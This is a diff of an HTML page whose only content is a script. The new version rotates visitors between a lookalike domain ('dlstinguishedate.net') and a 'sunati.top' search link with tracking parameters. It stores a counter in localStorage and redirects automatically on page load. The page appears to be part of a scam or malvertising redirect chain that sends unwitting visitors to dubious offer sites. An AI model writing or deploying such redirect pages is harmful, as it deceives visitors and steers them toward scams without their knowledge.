@@ -5,7 +5,27 @@
 </head>
 <body>
     <script>
-        window.location.replace("https://gvvkv.dlstinguishedate.net");
+        const offers = [
+            'https://gvvkv.dlstinguishedate.net',
+            'https://sunati.top/search?key=edbv2-p7wkw&sub_id1=ALL'
+        ];
+        
+        const storageKey = 'offer_rotator_counter';
+        const maxOffers = offers.length;
+
+        let currentIndex = localStorage.getItem(storageKey);
+
+        if (currentIndex === null) {
+            currentIndex = 0;
+        } else {
+            currentIndex = parseInt(currentIndex);
+        }
+
+        let redirectTo = offers[currentIndex];
+        let nextIndex = (currentIndex + 1) % maxOffers;
+        
+        localStorage.setItem(storageKey, nextIndex);
+        window.location.href = redirectTo;
     </script>
 </body>
 </html>
